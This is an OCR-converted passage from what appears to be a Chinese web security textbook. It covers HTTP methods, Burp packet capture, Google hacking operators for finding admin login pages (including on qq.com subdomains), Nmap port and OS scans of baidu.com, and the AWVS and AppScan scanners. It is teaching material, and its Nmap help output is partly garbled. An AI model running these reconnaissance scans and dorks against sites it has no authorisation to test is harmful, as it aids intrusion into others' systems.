POST 方法与 GET 方法相似，但最大的区别在于 GET 方法没有请求内容，而 POST 方法是有请求内容的。POST 请求最多用于向服务器发送大量的数据。GET 虽然也能发送数据，但是有大小（长度）的限制，并且 GET 请求会将发送的数据显示在浏览器端，而 POST 则不会，所以安全性相对来说高一点。

例如，上传文件、提交留言等，只要是向服务器传输大量的数据，通常都会使用 POST 请求。一个经典的 HTTP POST 请求如下：

```txt
POST /login.php HTTP/1.1
Host: www.xxser.com
Content-Length:26
Accept:text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
Origin:http://home.2cto.com
User-Agent:Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.17(KHTML, likeGecko)
Chrome/24.0.1312.57Safari/537.17SE2.XmetaSr1.0
Content-Type:application/x-www-form-urlencoded
Accept-Language:zh-CN, zh;q=0.8
Accept-Charset:GBK, utf-8;q=0.7, *;q=0.3
user=admins&pw=123456789 
```

用 POST 方法向服务器请求 login.php，并且传递参数 user=admins&pw=123456789。

## 2.2.3 其他 HTTP 请求

## 1. HEAD

HEAD 方法除了服务器不能在响应里返回消息主体外，其他都与 GET 方法相同。此方法经常被用来测试链接的有效性、可访问性和最近的改变。攻击者编写扫描工具时，就常用此方法，因为只测试资源是否存在，而不用返回消息主题，所以速度一定是最快的。

一个经典的 HTTPHEAD 请求如下:

```batch
HEAD /index.phpHTTP/1.1
HOST:www.xxser.com 
```

## 2. PUT

PUT 方法用于请求服务器把请求中的实体存储在请求资源下，若请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据，作为指定资源的最新修改版。若请求指定的资源不存在，将会创建这个资源，且数据为请求正文，请求如下：

```dockerfile
PUT /input.txt
HOST:www.xxser.com
Content-Length:6
123456 
```

这段 HTTP PUT 请求将会在主机根目录下创建 input.txt，内容为 123456。通常情况下，

服务器都会关闭 PUT 方法，因为它会为服务器建立文件，属于危险的方法之一。

## 3. DELETE

DELETE 方法用于请求源服务器删除请求的指定资源。服务器一般都会关闭此方法，因为客户端可以进行删除文件操作，属于危险方法之一。

## 4. TRACE

TRACE 方法被用于激发一个远程的应用层的请求消息回路，也就是说，回显服务器收到的请求。TRACE 方法允许客户端去了解数据被请求链的另一端接收的情况，并且利用那些数据信息去测试或诊断，但此方法非常少见。

## 5. CONNECT

HTTP 1.1 协议规范保留了 CONNECT 方法, 此方法是为了用于能动态切换到隧道的代理。

## 6. OPTIONS

OPTIONS 方法是用于请求获得由 URL 标识的资源在请求/响应的通信过程中可以使用的功能选项。通过这个方法，客户端可以在采取具体资源请求之前，决定对该资源采取何种必要措施，或者了解服务器的性能。HTTPS 请求如下：

```txt
OPTIONS /HTTP/1.1
HOST:www.xxser.com
HTTP/1.1200OK
Allow:OPTIONS,TRACE,GET,HEAD,POST
Server:Microsoft-IIS/7.5
Public:OPTIONS,TRACE,GET,HEAD,POST
X-Powered-By:ASP.NET
Date:Sun,14Jul201315:50:58GMT
Content-Length:0 
```

## 2.3 实战操作

应用 Burp 抓包软件，针对 GET、POST 请求类型进行简单抓包分析，如下为具体事例：此系统为某学生信息管理平台，现对其进行抓包请求分析，详细操作见第 2 章视频 2-1。

## 1. GET 请求

访问并浏览相关页面信息时，数据包信息如图 2-2 所示。如图 2-3 所示为图示例页面。

![image](MinerU_markdown_Web安全基础教程_assets/image_0013_54fdde3cbdff.jpg)



图2-2 GET请求数据包


<table><tr><td colspan="3">学生信息详情</td></tr><tr><td>ID</td><td>3</td><td rowspan="5"></td></tr><tr><td>姓名</td><td>王莹莹</td></tr><tr><td>性别</td><td>女</td></tr><tr><td>年龄</td><td>15</td></tr><tr><td>班级</td><td>高一3班</td></tr><tr><td colspan="3">浏览... 未选择文件。 图片上传</td></tr></table>


图 2-3 图示例页面


## 说明如下：

```txt
GET /view?id=3 HTTP/1.1 //get 请求参数（id=3），HTTP 协议 1.1 版本
Host: localhost //网站地址，这里即本地地址：127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
//浏览器信息
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/list?page=1 //访问来源地址，即 http://127.0.0.1/
Cookie: JSESSIONID=06FCD3AD35077711D5D4883FBA5EFCFC //Cookie 会话标识符
Connection: keep-alive //连接状态，正常连接
```

## 2. POST 请求

（1）登录平台，用户名：admin，密码：admin123，如图 2-4 所示。

(2) 数据包信息如图 2-5 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0014_7ca10d713f14.jpg)



图 2-4 POST 请求示例页面


![image](MinerU_markdown_Web安全基础教程_assets/image_0015_e832c07a2a50.jpg)



图2-5 POST请求数据包


## 说明如下：

```txt
POST /login HTTP/1.1 // HTTP 协议 1.1 版本
Host: localhost // 网站地址，这里即本地地址：127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0 // 浏览器信息
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/ // 访问来源地址，即 http://127.0.0.1/
Cookie: JSESSIONID=06FCD3AD35077711D5D4883FBA5EFCFC // Cookie 会话标识符
Connection: keep-alive // 连接状态，正常连接
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
username=admin&password=admin123 // post 请求参数：username;password
```

## 第2篇

## Web 安全测试方法

## 信息探测

## 3.1 Google Hacking

Google Hacking，百度百科释意为利用 Google 搜索引擎搜索信息来进行入侵的技术和行为，现指利用各种搜索引擎搜索信息来进行入侵的技术和行为。

## 3.1.1 搜集子域名

子域名是顶级域名（一级域名）的下一级域名。例如，mail.example.com 和 calendar.example.com 是二级域 example.com 的两个子域，而 example.com 则是顶级域 com 的子域。本节以 qq.com 为例进行子域名搜集。

如图 3-1 所示，在百度搜索栏中（其他浏览器均可）输入 site:qq.com，可以搜索出域名 qq.com 的子域名。

![image](MinerU_markdown_Web安全基础教程_assets/image_0016_39830a29cd91.jpg)



图 3-1 搜集指定子域名


## 3.1.2 搜集 Web 信息

Web 信息的搜集建立在 IP、域名以及端口所收集到的数据之上。每个 IP 及域名对外开放的端口都可能搭建了 Web 服务。

3.1.1 节中介绍了使用 site 关键字搜集子域名，本节将继续介绍 Google Hack 的其他常用语法，以便进行更广泛的 Web 信息探测，常用的语法如下。

○ site: 指定域名。

○ intext: 正文中存在关键字的网页。

○ intitle: 标题中存在关键字的网页。

○ info: 一些基本信息。

○ inurl: URL 存在关键字的网页。

○ filetype: 搜索指定文件类型。

案例一：搜索正文中存在“北大附中”字样的网站。

语法：

intext:北大附中

结果如图 3-2 所示。

案例二：搜索标题存在指定敏感信息的网站。

输入 “intitle: 后台登录”，可查询网页标题中存在“后台登录”字样的网站，搜索结果如图 3-3 所示。

<table><tr><td colspan="2">intext:北大附中</td></tr><tr><td colspan="2">网页 新闻 贴吧 知道 音乐 图片 视频 地图 文库</td></tr><tr><td colspan="2">百度为您找到相关结果约159个
▼接</td></tr><tr><td colspan="2">北大附中校园信息管理系统登录
若忘记密码,请直接单击&quot;重设密码&quot;重新设定密码。版权所有:北京大学附属中学网络中心支持.it@pkuschool.edu.cn,010-58751116...
portal.pkuschool.edu.c... - 百度快照 - 评价</td></tr><tr><td colspan="2">北大附中学校介绍</td></tr><tr><td colspan="2">北大附中现有行知学院(Xingzhi Academy)、元培学院(Yuanpei Academy)、博雅学院(Boya Academy)、道尔顿学院(Dalton Academy)四个学院。...
www.pkuschool.edu.cn/h... - 百度快照 - 评价</td></tr><tr><td colspan="2">兔女郎系列番号图 兔女郎系列番号图
本站提供 兔女郎系列番号图兔女郎系列番号图 相关图片 视频 文章 在线观看下载阅读...
【allintext长泽梓 下载】河南教师招聘:北大附中河南分校焦作校区2013年招聘中学...
www.wsie.027138.cc/ - 百度快照 - 评价</td></tr><tr><td colspan="2">北大附中国际部中方主任:北大附中的一天国际学校国际...新浪教育</td></tr></table>


图 3-2 搜索存在指定关键字的网站


<table><tr><td colspan="2">intitle:后台登录</td></tr><tr><td colspan="2">网页 新闻 贴吧 知道 音乐 图片 视频 地</td></tr><tr><td colspan="2">百度为您找到相关结果约129,000个</td></tr><tr><td colspan="2">后台管理系统登录
登录管理系统 帐号* 密码* 三个礼拜内自动登录 忘记密码? 登录 最专业
copyright©2011-2016 demlution All Rights Reserved...
www.demlution.com/acco... - 百度快照 - 95%好评</td></tr><tr><td colspan="2">后台登录
后台登录 用户名: 密码: ...
my.solution.it168.com/ - 百度快照 - 57条评价</td></tr><tr><td colspan="2">后台登陆
用户名: 密码: 版权所有 武汉制造业信息化工程技术有限公司...
communityadmin.e-works... - 百度快照 - 81%好评</td></tr><tr><td colspan="2">后台登录
网站域名 密码 验证码 记住密码 ...
vip.00368.com/ - 百度快照 - 评价</td></tr></table>


图 3-3 搜索标题存在后台登录字样的网站


案例三：搜索存在 installing npm packages 相关信息的网站，输入的内容及结果如图 3-4 所示。

<table><tr><td colspan="10">info: installing npm packages</td></tr><tr><td colspan="10">网页 新闻 贴吧 知道 音乐 图片 视频 地图 文库 更多»</td></tr><tr><td colspan="10">百度为您找到相关结果约257,000个 丫搜索工具</td></tr><tr><td colspan="10">您可以仅查看：英文结果</td></tr><tr><td colspan="10">npm
查看此网页的中文翻译，请点击翻译此页
npm is the package manager for javascript... npm is the package manager for JavaScript. Find. share. and reuse packages of code from hundreds of thousands...
www.npmjs.com/ - 百度快照 - 评价</td></tr><tr><td colspan="10">npm
查看此网页的中文翻译，请点击翻译此页
npm is the package manager for javascript... npm is the package manager for JavaScript. Find. share. and reuse packages of code from hundreds of thousands...
www.npmjs.org/ - 百度快照 - 评价</td></tr><tr><td colspan="10">04 - Installing npm packages locally | npm Documentation
查看此网页的中文翻译，请点击翻译此页
The place where all things npm are documented... Installing npm packages locallyThere are t</td></tr></table>


图 3-4 搜索关键信息相关的网站



案例四：搜索 URL 中存在/interplugin/face2/的网站，输入的内容及结果如图 3-5 所示。


<table><tr><td>inurl: /interplugin/face2/</td></tr><tr><td>网页 新闻 贴吧 知道 音乐 图片 视频 地图 文库 更多»
百度为您找到相关结果约17个
丁搜索工具
国家食品药品监督管理局-数据查询
2.细胞保存液(鄂食药监械(准)字2013第1410041号 武汉智迅创源科技发展股份有限公司) 3.光子做肤冷凝胶(鄂食药监械(准)字2013第1231813号 武汉华工激光医疗设...
www.whfda.gov.cn/inter... - 百度快照 - 评价
河南省食品药品监督管理局-数据查询
2.定制式固定义齿(绵阳市英美齿业有限公司 绿械注准20152630298) 3.中频脉冲治疗仪(漯河郑澳医疗器械设备有限公司 绿械注准20152260334) 4.定制式活动义齿...
www.hda.gov.cn/interpl... - ¥3 - 百度快照 - 评价
武汉市食品药品监督管理局-数据查询
当前位置:网站首页 &gt;&gt; 数据查询 审批系统企业查询 湖北省药品批发企业查询 药品零售企业/医疗器械零售企业查询 器械批发企业 餐饮服务电子地图 ...
www.whfda.gov.cn/inter... - 百度快照 - 评价
湖南省卫生计生综合监督局-数据查询
2.邓权塑业科技(湖南)有限公司 (邓权牌PP-R给水管 湘卫水字(2012)第0031号) 3.邓权塑业科技(湖南)有限公司 (邓权牌PVC-M给水管 湘卫水字(2012)第0032号)...</td></tr></table>


图 3-5 搜索指定 URL 路径的网站


案例五：搜索指定文件类型的网站，结果如图 3-6 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0017_d8f8d1014f21.jpg)



图 3-6 搜索指定文件类型的网站



案例六：搜索 URL 中存在 admin 关键字，title 存在后台关键字的腾讯网的子网站，结果如图 3-7 所示。


<table><tr><td>intitle:后台 site:qq.com inurl:admin</td></tr><tr><td>网页 新闻 贴吧 知道 音乐 图片 视频 地图 文库 时间不限 所有网页和文件 qq.com 认证后台管理 为什么我的空间已经认证了,但是在分类里面却找不到我自己的空间?不是每个认证室 出现在分类中的推荐位里面的。分类的推荐位是有数量限制的,每个月我们有专... ctc.qzs.qq.com/qzone/b... - 百度快照 - 评价 产品交流管理后台-用户登录 请您使用QQ登录!关于腾讯 | About Tencent | 服务条款 | 广告服务 | 腾讯招聘 | 客服 导航 Copyright © 1998 - 2010 Tencent. All Rights ... support.qq.com/beta2/s... - 百度快照 - 评价 明星公众号管理后台 Copyright © 1998 - 2004 Tencent.All Rights Reserved 鹏讯公司 股权所有 ... mobile.ent.qq.com/admi... - 百度快照 - 100条评价 腾讯地方站招聘平台-运营后台 鹏讯地方站招聘平台V2 | 运营后台[切换频道/项目]登录检查失败 重试 返回上一步 关 游网 | 服务条款 | 广告服务 | 大渝德师 | 腾讯招聘 | 腾讯... job.cq.qq.com/admin/ - 百度快照 - 评价</td></tr></table>


图 3-7 综合查询


## 3.2 Nmap Scanning

Nmap（Network Mapper）是 Linux 下的网络扫描和嗅探工具包，用于扫描网上计算机开放的网络连接端，确定服务运行的连接端，并可推断计算机上运行的操作系统（亦称 fingerprinting 指纹识别）。Nmap 是网络管理员必用的软件之一，用以评估网络系统安全。

## 3.2.1 安装Nmap

本节以 Windows 操作系统为例，讲解如何安装 Nmap。

第一步，从官网 https://nmap.org/download.html 下载 Nmap 的安装包，如图 3-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0018_ca80dc142aea.jpg)



图 3-8 下载 Nmap 安装包


第二步，双击安装包，弹出软件的安装界面，单击 I Agree 按钮，如图 3-9 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0019_ce7d1ed913f4.jpg)



图 3-9 同意安装 Nmap


第三步，选择需要安装的功能，若无特别需求，默认即可，如图 3-10 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0020_ae5b7d09927f.jpg)



图 3-10 选择安装功能


第四步，选择软件安装路径，该软件安装所需空间不大，可选择默认路径，如图 3-11 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0021_d4c1af34400b.jpg)



图 3-11 选择安装位置


第五步，继续安装并提示相关的软件依赖包的关联，如图 3-12 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0022_d8637f5eda04.jpg)



图 3-12 继续安装


第六步，Nmap 安装完后，为使用方便，还需进行环境变量的配置。具体步骤为：右击“计算机”，在弹出的菜单中选择“属性”→“高级系统设置”→“高级”→“环境变量”命令，在系统变量中找到 path。对 path 进行编辑，在 path 已有数据后加上英文“;”，输入 Nmap 安装目录，本次安装路径为 D:\anquanfuwu\namp\anzhuang\Nmap，结果如图 3-13 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0023_1b2f1d19ec0c.jpg)



图 3-13 编辑环境变量


设置完成后，可通过系统命令获取Nmap相关信息，以此验证配置是否成功，如图3-14所示。

```txt
C:\Users\vxl\Nmap
Nmap 6.49BETA4 < https://nmap.org >
Usage: nmap [Scan Type(s)] [Options] <target specification>
TARGET SPECIFICATION:
Can pass hostnames, IP addresses, networks, etc.
Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
-iL <inputfilename>: Input from list of hosts/networks
-iR <num hosts>: Choose random targets
-exclude <host1[,host2][,host3],...>: Exclude hosts/networks
-excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
-s1: List Scan - simply list targets to scan
-sm: Ping Scan - disable port scan
-Fm: Treat all hosts as online - skip host discovery
-FS/PA/PU/FY[porclist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-FE/PF/PM: ICMP echo, timestamp, and netmask request discovery probes
-PO[protocol list]: IP Protocol Ping
-n/-R: Never do DNS resolution/Always resolve [default: sometime]
-dns-server <serv1[,serv2],...>: Specify custom DNS servers
-system-dns: Use OS's DNS resolver
-traceroute: Trace hop path to each host
SCAN TECHNIQUES:
-s$/sI/sA/sM/sM: TCP SYN/Connect()/ACK/Window/Haimon scans
-sU: UDP Scan
-sM/sF/sX: TCP Null, FIN, and Xmas scans
-scanflags <flags>: Customize TCP scan flags
-sI <zombic host[:probeport]>: Idle scan
-sY/sZ: SCTP INIT/CODKIE-ECHO scans
-sO: IP protocol scan
-b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
-p <port ranges>: Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,8:9
-exclude-ports <port ranges>: Exclude the specified ports from scanning
-F: Fast node - Scan fewer ports than the default scan
-r: Scan ports consecutively - don't randomize
-top-ports <number>: Scan <number> most common ports
-port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:
-sU: Probe open ports to determine service/version info
-version-intensity <level>: Set from 0 (light) to ? (try all probes)
-version-light: Limit to most likely probes (intensity 2)
-version-all: Try every single probe (intensity 9)
-version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
-sC: equivalent to --script=default
-script=<Lua scripts>: <Lua scripts> is a comma separated list of directories, script-files or script-categories
-script-args=<ni-v1,[m2-v2,...]; provide arguments to scripts
-script-args-file=filename: provide NSE script args in a file 
```


图3-14 Nmap相关信息


设置成功后可以利用图形化界面打开Nmap，如图3-15所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0024_9751f3cd9617.jpg)



图3-15Zenmap图形化界面


## 3.2.2 探测主机信息

Nmap 有三个基本功能：探测主机是否在线；扫描主机端口，嗅探所提供的网络服务；推断主机所用的操作系统。

Nmap 常用的扫描参数如下:

-sT 参数是 TCP connect 扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。

-sP 参数是 Ping 扫描，Nmap 在扫描端口时默认使用 Ping 扫描，只有主机存活，Nmap 才会继续扫描。

-sS 参数是半开扫描，使用时需要 root 权限，很少有系统将其记入系统日志。

-sU 参数是 UDP 扫描，此扫描不可靠。

-sA 参数是用来穿过防火墙的规则集。

-sV 参数是探测端口服务版本。

-PO 参数是指扫描之前不需要 Ping 命令，有些防火墙禁止用 Ping 命令。可以使用此参数进行扫描。

-v 参数是指显示扫描过程。

-h 参数是指帮助选项。

-p 参数是指定端口，如 1-65536、1433、135、80 等。

-o 参数是启用远程操作系统检测，存在误报的情况。

-A 参数是指全面系统检测、启用脚本检测、扫描等。

-oN/-oX/-oG 参数是指将报告写入文件，分别是正常、XML、grepable 三种格式。

-T4 参数是指针对 TCP 端口禁止动态扫描延迟超过 10ms。

-iL 参数是读取主机列表，例如，-iL c:\ip.txt。

介绍完各个参数的用途，下面通过案例对 Nmap 常用参数进行进一步了解。实际扫描时可以使用系统命令，也可以使用上节所讲的 Zenmap 图形化界面来进行，本节用 Zenmap 图形化界面为例讲述。

案例一：扫描指定 IP 上的开放端口。以 192.168.10.1 为例，扫描 1-65535 所有端口中的开放端口。

Nmap 命令为 namp -p 1-65535 -v 192.168.10.1，详情如图 3-16 所示。

<table><tr><td colspan="6">192.168.10.1</td><td></td><td></td></tr><tr><td colspan="6">namp -p 1-65535 -v 192.168.10.1</td><td></td><td></td></tr><tr><td>主机</td><td>服务</td><td>Nmap输出</td><td>总口/主机</td><td>拓扑</td><td>主机明细</td><td>扫描</td><td></td></tr><tr><td rowspan="2" colspan="2">系统4 主机
IP localhost (1)</td><td colspan="5">namp -p 1-65535 -v 192.168.10.1</td><td></td></tr><tr><td colspan="6">Starting Nmap 6.49BETA4 (https://nmap.org) at 2016-07-26 14:26 ?D1ú±ê=?ê±?? 
Initiating ARP Ping Scan at 14:26 
Scanning 192.168.10.1 [1 port] 
Completed ARP Ping Scan at 14:26, 1.3Bs elapsed (1 total hosts) 
Initiating Parallel DNS resolution of 1 host. at 14:26 
Completed Parallel DNS resolution of 1 host. at 14:26, 0.01s elapsed 
Initiating SYN Stealth Scan at 14:26 
Scanning localhost (192.168.10.1) [65535 ports] 
Discovered open port 22/tcp on 192.168.10.1 
Increasing send delay for 192.168.10.1 from 0 to 5 due to 72 out of 238 dropped probes since last increase 
SYN Stealth Scan Timing: About 4.28% done; ETC: 14:38 (0:11:47 remaining) 
SYN Stealth Scan Timing: About 8.92% done; ETC: 14:37 (0:10:23 remaining) 
SYN Stealth Scan Timing: About 13.63% done; ETC: 14:37 (0:09:37 remaining) 
SYN Stealth Scan Timing: About 18.99% done; ETC: 14:37 (0:09:02 remaining) 
SYN Stealth Scan Timing: About 24.41% done; ETC: 14:37 (0:08:25 remaining) 
SYN Stealth Scan Timing: About 29.76% done; ETC: 14:37 (0:07:50 remaining) 
SYN Stealth Scan Timing: About 43.41% done; ETC: 14:39 (0:07:15 remaining) 
Increasing send delay for 192.168.10.1 from 5 to 10 due to max_successful_tryno increase to 4 
SYN Stealth Scan Timing: About 52.98% done; ETC: 14:40 (0:06:35 remaining) 
SYN Stealth Scan Timing: About 59.66% done; ETC: 14:40 (0:05:S2 remaining) 
SYN Stealth Scan Timing: About 66.12% done; ETC: 14:41 (0:05:06 remaining) 
SYN Stealth Scan Timing: About 72.01% done; ETC: 14:41 (0:04:18 remaining) 
SYN Stealth Scan Timing: About 76.96% done; ETC: 14:41 (0:03:30 remaining) 
SYN Stealth Scan Timing: About 81.91% done; ETC: 14:41 (0:02:44 remaining) 
SYN Stealth Scan Timing: About 87.16% done; ETC: 14:41 (0:01:S6 remaining) 
SYN Stealth Scan Timing: About 92.12% done; ETC: 14:41 (0:01:11 remaining) 
Completed SYN Stealth Scan at 14:41, 902.72s elapsed (65535 total ports) 
Nmap scan report for localhost (192.168.10.1) 
Host is up (0.019s latency). 
Not shown: 65530 closed ports 
PORT CTAXS PRUGER</td></tr></table>


图 3-16 扫描 1-65536 端口情况


案例二：指定端口扫描，只扫描80和22端口，以百度为例。

Nmap 命令为 nmap -p 80,22 www.baidu.com，详情如图 3-17 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0025_36a14e7d457c.jpg)



图 3-17 扫描百度 80 和 22 端口开放情况


案例三：探测主机操作系统，以百度网站为例。

Nmap 命令为 nmap -O www.baidu.com，详情如图 3-18 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0026_9fd03d3920dd.jpg)



图 3-18 扫描百度网站主机操作系统


案例四：全面的系统探测，以百度网站为例。

Nmap 命令为 nmap -v -A www.baidu.com，详情如图 3-19 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0027_9335abbebb00.jpg)



图 3-19 全面扫描


## 3.3 实战操作

（1）利用 Google Hack 常用关键字对网站进行检索。

（2）利用 Nmap 常用参数对网站进行扫描。

详细操作见第 3 章视频 3-1。

# Web 漏洞检测工具简介

## 4.1 AWVS 介绍

WVS（Web Vulnerability Scanner）是一个自动化的 Web 应用程序安全测试工具，可用于扫描任何通过 Web 浏览器访问和遵循 HTTP/HTTPS 规则的 Web 站点和 Web 应用程序。

WVS 的主要特点:

自动的客户端脚本分析器，允许对 Ajax 和 Web 2.0 应用程序进行安全性测试。

○ 高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer。

- 可视化宏记录器帮助用户轻松测试 Web 表格和受密码保护的区域。

- 支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证机制。

- 丰富的报告功能，包括 VISA PCI 依从性报告。

○ 高速的多线程扫描器轻松检索成千上万个页面。

- 智能爬行程序检测 Web 服务器类型和应用程序语言。

○ Acunetix 检索并分析网站，包括 flash 内容、SOAP 和 Ajax。

☐ 端口扫描 Web 服务器并对在服务器上运行的网络服务执行安全检查。

○ 可导出网站漏洞文件。

## 4.1.1 WVS 向导扫描

WVS 的界面非常直观，在 Tools 模块提供各种实用工具，包括蜘蛛爬行、端口扫描、盲注测试、子域名查找、HTTP 编辑器等。本节课重点介绍如何使用 WVS 扫描网站。

单击 New Scan 弹出 WVS 向导，在扫描网站前，需先设定以下选项，如图 4-1 所示。

- Scan Type 

Options 

o Target 

○ Login 

○ Finish 

![image](MinerU_markdown_Web安全基础教程_assets/image_0028_2450c9ba509d.jpg)



图4-1 扫描向导


## 1. Scan Type

Scan Type 中涉及如下几个选项:

- Scan single website 

在 Website URL 处填入需要扫描的网站网址。WVS 支持 HTTP/HTTPS 网站扫描。

- Scan using saved crawling results 

导入 WVS 内置 site crawler tool 的爬行结果，进行漏洞扫描。

- Access the schelluler interface 

批量扫描网站可访问 http://localhost:8183，扫描后的文件存放在 C:\Users\Public\Documents\AcunetixWVS 8\Saves，如图 4-2 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0029_883c8daaccaa.jpg)



图4-2 Scan Type设置


## 2. Options

Options 部分主要分为以下两部分，如图 4-3 所示。

○ Scannin profile 可设定扫描重点，类型如表 4-1 所示（列举部分）。


表 4-1 扫描类型


<table><tr><td>类 型</td><td>说 明</td></tr><tr><td>Blind SQL Injection</td><td>盲注扫描</td></tr><tr><td>CSRF</td><td>跨域访问</td></tr><tr><td>Default</td><td>默认配置(均检测)</td></tr><tr><td>Directory and file</td><td>目录与文件检测</td></tr></table>

○ Scan settings 可制定扫描器扫描选项，例如，Headers and Cookies、Parameter Exclusions。

![image](MinerU_markdown_Web安全基础教程_assets/image_0030_fcdcf86b9f78.jpg)



图4-3 Options设置


## 3. Target

当 WVS 无法判断服务器所使用的脚本语言时，可手动指定，如图 4-4 所示。

<table><tr><td colspan="2">Target
Please wait until the scanning is finished. You can also adjust details such as operating system, webserver, technology or change the base path. By entering these details you can reduce the scanning time.</td></tr><tr><td colspan="2">Target information</td></tr><tr><td>testhtml5.vulnweb.com:80
Base path
Server banner
Target URL
Operating system
WebServer
Optimize for following technologies
ASP
ASP.NET
Peil
Java/J2EE
ColdFusion/Jrun
Python
Rails
FrontPage</td><td>✓
/ 
nginx/1.4.1
http://testhtml5.vulnweb.com:80/
Unknown
nginx
[PHP]
□
□
□
✓</td></tr></table>


图4-4 Target设置


## 4. Login

扫描过程中发现有些网站中存在登录页面，此时可单击 New Login Sequence 登录指定页面，登录后，WVS 会保存登录信息。若此步骤默认，WVS 在扫描出登录页面后，会提示需登录，如图 4-5 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0031_7c57f5695c56.jpg)



图4-5 Login设置


## 5. Finish

以上配置均完成后，即可开启一次 Web site Scan。

## 4.1.2 Web 扫描服务

本节扫描 WVS 默认提供的测试网站：http://testhtml5.vulnweb.com，对扫描结果进行分析。扫描结果如图 4-6 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0032_dba4128d11fc.jpg)



图4-6 扫描结果


WVS 扫描完成后，可直观地显示网站漏洞数量、漏洞类型等信息。单击扫描结果的节点，可以查看漏洞详情。单击工具栏中的“保存”（Save Scan Results）按钮，可将扫描结果保存为 WVS 文件，该文件可以通过 WVS 工具打开，并查看详细信息，如图 4-7 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0033_62259d4f9fe3.jpg)



图 4-7 扫描结果保存


WVS 支持生成报告，在未安装 WVS 的计算机上也可查看扫描结果。操作步骤如下：

（1）单击 Report 按钮打开 Acunetix WVS Reporter，如图 4-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0034_a7a05470171f.jpg)



图 4-8 打开 Acunetix WVS Reporter


（2）单击操作按钮选择需要导出的文件格式，如图 4-9 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0035_23e380aea108.jpg)



图 4-9 选择导出文件格式


（3）在 Export 选项卡中可进行导出页面设置，在 Information 选项卡中可填写报告标题等信息，如图 4-10 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0036_a210959ce00b.jpg)



图 4-10 导出文件设置


（4）单击 OK 按钮后，可生成需要的格式，WVS 支持 PDF、HTML、TXT、Word、BMP 格式。

## 4.2 AppScan 介绍

AppScan 是一款 Web 应用安全测试工具，IBM Security AppScan 可自动化进行 Web 应用的安全漏洞评估工作，能扫描和检测常见的 Web 应用安全漏洞，例如，SQL 注入（SQL-injection）、跨站点脚本攻击（cross-site scripting）、缓冲区溢出（buffer overflow）等漏洞。

## 4.2.1 使用 AppScan 扫描

启动 AppScan，进入 AppScan 主界面，如图 4-11 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0037_6c81301c4fbd.jpg)



图 4-11 AppScan 主界面


单击 “创建新的扫描”，选择常规扫描，并启动扫描配置向导，如图 4-12 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0038_e551ec83a693.jpg)



图 4-12 启动扫描


选择 Web 应用程序扫描，对 AppScan 提供的 DEMO 网站 demo.testfire.net 进行扫描。若要使用代理，则选中“我需要配置其他连接设置（代理、平台认证）”复选框，然后继续下一步操作，如图 4-13 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0039_c002112fbdba.jpg)



图 4-13 添加扫描 URL


在登录界面中可以进行预登录操作，AppScan 提供了以下 4 个选项。

- 记录：使用预登录操作，直接保存登录信息。

- 提示：当 AppScan 检测到 form 表单时，将会提示填写登录信息。

自动：直接填写登录信息，当 AppScan 检测到 form 表单时，按照填写的信息自动填写。

○ 无：不登录。

默认选择 “无”，选择好登录方式后，继续下一步，可看到测试策略界面。

在测试策略区域可以选择测试的策略。默认情况下，将会使用除侵入式测试以外的所有测试，可选择默认值，也可根据需要来指定策略。选择完成后，继续下一步操作，进入扫描配置向导。

在扫描配置向导模块，提供了 4 种扫描方式，如图 4-14 所示。

<table><tr><td>URL 和服务器
登录管理
测试策略
完成</td><td rowspan="3">② 完成扫描配置向导
您已成功完成“扫描配置向导”。
您想要如何启动？
◎ 启动全面自动扫描(A)
○ 仅使用自动“探索”启动(E)
○ 使用“手动探索”启动(M)
○ 我将稍后启动扫描(L)
⑦ 完成“扫描配置向导”后启动“扫描专家”(S)</td></tr><tr><td>一般任务</td></tr><tr><td>完全扫描配置
帮助</td></tr><tr><td></td><td>&lt;上一步(B) 完成(F)</td></tr></table>


图 4-14 配置扫描向导


